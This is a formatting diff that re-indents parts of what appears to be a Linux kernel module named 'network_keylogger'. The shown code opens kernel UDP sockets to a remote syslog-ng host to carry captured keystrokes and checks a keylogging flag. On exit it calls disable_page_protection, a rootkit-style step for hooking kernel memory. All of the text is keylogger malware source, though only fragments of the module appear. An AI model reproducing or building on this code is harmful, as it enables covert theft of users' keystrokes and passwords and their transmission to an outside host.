@@ -54,29 +54,29 @@ void insert_host(struct sockaddr_in *addr) {
 	if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &host->sock) < 0) {
 
 		return;
-    }
+	}
 
-    debug("CREATED SOCKET (%pI4, UDP)", &addr->sin_addr.s_addr);
+	debug("CREATED SOCKET (%pI4, UDP)", &addr->sin_addr.s_addr);
 
-    /* set addr and port */
-    memcpy(&host->addr, addr, sizeof(struct sockaddr_in));
-    host->addr.sin_port = htons(SYS_PORT);
+	/* set addr and port */
+	memcpy(&host->addr, addr, sizeof(struct sockaddr_in));
+	host->addr.sin_port = htons(SYS_PORT);
 
-    /* connect to syslog-ng server */
-    if(host->sock->ops->connect(host->sock, (struct sockaddr *)&host->addr, sizeof(struct sockaddr), 0) < 0) {
+	/* connect to syslog-ng server */
+	if(host->sock->ops->connect(host->sock, (struct sockaddr *)&host->addr, sizeof(struct sockaddr), 0) < 0) {
 
-    	alert("SOCKET CONNECT FAILED")
+		alert("SOCKET CONNECT FAILED")
 
 		sock_release(host->sock);
 		host->sock = NULL;
 
-    	return;
-    }
+		return;
+	}
 
-    debug("SOCKET CONNECT (READY TO SEND)");
+	debug("SOCKET CONNECT (READY TO SEND)");
 	debug("INSERT HOST ADDRESS %pI4", &addr->sin_addr.s_addr);
 
-    /* insert in host node list */
+	/* insert in host node list */
 	insert_data_node(&hosts, (void *)host);
 
 	if(!keylogging) {
@@ -263,10 +263,10 @@ void network_keylogger_exit(void) {
 	debug("EXIT KEYLOGGER");
 
 	/* clear buffer list */
-    free_data_node_list(&buffers);
+	free_data_node_list(&buffers);
 
-    /* clear hosts list */
-    free_data_node_list_callback(&hosts, release_socket);
+	/* clear hosts list */
+	free_data_node_list_callback(&hosts, release_socket);
 
 	disable_page_protection();
 
